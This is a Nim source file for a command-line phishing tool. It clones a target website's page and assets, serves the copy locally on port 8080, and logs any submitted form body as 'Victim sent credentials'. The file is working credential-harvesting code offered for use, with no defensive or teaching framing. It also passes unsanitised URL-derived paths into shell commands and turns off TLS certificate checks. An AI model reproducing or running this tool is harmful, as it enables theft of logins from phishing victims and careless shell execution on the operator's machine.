import std/asynchttpserver
import std/asyncdispatch
import std/strformat
import std/httpclient
import std/net
import std/re
import std/strutils
import argparse

const
    NAME_TEMP_DIR = ".sheeple_tmp"

var 
    p = newParser:
        arg("target")
    content_to_serve: string

let
    server = newAsyncHttpServer()

proc handle_request(req: Request) {.async gcsafe.} =
    if req.reqMethod == HttpPost:
        echo fmt"[{req.reqMethod} {req.url.path}] Victim sent credentials: " & req.body
        let headers = {"Content-type": "text/plain; charset=utf-8"}
        # TODO: redirect to original page
        await req.respond(
            Http200, 
            "<>< <>< sorry <>< <><", 
            headers.newHttpHeaders()
        )

    elif req.reqMethod == HttpGet:
        # echo fmt"[{req.reqMethod} {req.url.path}] Victim clicked: " & req.headers["user-agent"]

        var file_to_serve = req.url.path
        if req.url.path == "/":
            file_to_serve = "/index.html"

        let file_path = NAME_TEMP_DIR & file_to_serve

        try:
            await req.respond(
                Http200, 
                string(readFile(file_path))
            )
        except IOError:
            echo "[!] Error reading " & file_path
            await req.respond(
                Http404, 
                "<html>404 Not found</html>"
            )

proc clone_page(target_url: string) =       
    discard execShellCmd(fmt"mkdir {NAME_TEMP_DIR}")
    let client = newHttpClient(sslContext = newContext(verifyMode = CVerifyNone))
    
    # save page as index
    content_to_serve = client.getContent(target_url)
    writeFile(fmt"{NAME_TEMP_DIR}/index.html", content_to_serve)

    # download all referenced files 
    # this part is super hacky but f it :^)
    var rHrefLink = re(r"href=""(.*?)""(.*)?/>")
    var rSrc = re(r"src=""(.*?)""(.*)?>")

    var hrefs: seq[string] = @[]
    var srcs: seq[string] = @[]

    for href in re.findAll(content_to_serve, rHrefLink):
        var href_to_add = href.split("=\"")[1].split("\"")[0]
        if href_to_add.startsWith("http"): continue # absolute links are fine 
        if not href_to_add.startsWith("/"): href_to_add = "/" & href_to_add
        hrefs.add(href_to_add)

    for src in re.findAll(content_to_serve, rSrc):
        var src_to_add = src.split("=\"")[1].split("\"")[0]
        if src_to_add.startsWith("http"): continue # absolute links are fine 
        if not src_to_add.startsWith("/"): src_to_add = "/" & src_to_add
        srcs.add(src_to_add)

    echo fmt"[*] Downloading {len(hrefs & srcs)} file(s) to clone website..."
    for target_file in hrefs & srcs:
        var target_protocol = target_url.split("/")[0] 
        var target_domain = target_url.split("/")[2]

        var dirs = target_file.split("/")
        var dirs_to_create: string = NAME_TEMP_DIR & target_file.split("/")[0..len(dirs)-2].join("/")
        dirs_to_create.removePrefix('/')

        when system.hostOS == "windows":
            discard execShellCmd("powershell -c \"mkdir " & dirs_to_create & "\" > NUL")
        when system.hostOS == "linux" or system.hostOS == "macosx":
            discard execShellCmd("mkdir -p " & dirs_to_create)

        try:
            echo "[*] Downloading " & target_protocol & "//" & target_domain & target_file
            var content = client.getContent(target_protocol & "//" & target_domain & target_file)
            writeFile(fmt"{NAME_TEMP_DIR}{target_file}", content)
        except HttpRequestError:
            echo "[404] " & target_protocol & "//" & target_domain & target_file
    echo "[*] Done!"


proc clean_files() =
    echo "[!] cleaning up"
    when system.hostOS == "windows":
        discard execShellCmd(fmt"rm -r {NAME_TEMP_DIR}")
    when system.hostOS == "linux" or system.hostOS == "macosx":
        discard execShellCmd(fmt"rm -rf {NAME_TEMP_DIR} >/dev/null")

proc ctrlc() {.noconv.} =
  clean_files()
  quit(0)

when isMainModule:
    setControlCHook(ctrlc)
    stdout.write dedent """
   _.%%%%%%%%%%%%%
  /- _%%%%%%%%%%%%%
 (_ %\|%%%%%%%%%%%%
    %%%$$$$$$$$$$$%
      S%S%%%*%%%%S
  ,,,,# #,,,,,,,##,,,,,
[ dumb web page cloner v0.1 ]
""" & "\n"
    try:
        let opts = p.parse()

        echo fmt"[*] cloning {opts.target} to {NAME_TEMP_DIR}"
        clone_page(opts.target)

        echo "[*] starting server on port 8080"
        server.listen(Port(8080)) 

        while true:
            if server.shouldAcceptRequest():
                waitFor server.acceptRequest(handle_request)
            else:
                waitFor sleepAsync(500)
    except ShortCircuit as e:
        if e.flag == "argparse_help":
            echo p.help
        quit(1)
    except UsageError:
        echo p.help
        echo getCurrentExceptionMsg()
        quit(1)
